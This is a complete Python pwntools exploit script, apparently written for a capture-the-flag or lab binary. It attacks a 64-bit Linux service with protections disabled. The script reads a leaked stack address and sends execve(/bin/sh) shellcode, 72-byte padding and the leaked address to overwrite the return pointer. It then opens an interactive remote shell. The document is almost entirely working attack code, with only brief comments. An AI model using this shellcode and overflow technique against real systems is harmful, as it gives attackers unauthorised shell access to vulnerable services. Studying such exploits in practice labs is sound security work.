#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits All disabled

# Checksec

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)

# /proc/sys/kernel/randomize_va_space 0

from pwn import *

shell = remote('10.10.10.10', 4444)

shell.recvuntil(b"Oops, I'm leaking! ")
leaking = int(shell.recvuntil(b"\n"),16)

# Little-Endian format

# Execute third
# Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# Execute second
# offset
payload += b"A"*(72-len(payload))

# Execute first
# Oops, I'm leaking! 0x7fffe23b08c0. RIP to the stack
payload += p64(leaking)

shell.recvuntil(b"> ")
shell.sendline(payload)
shell.interactive()
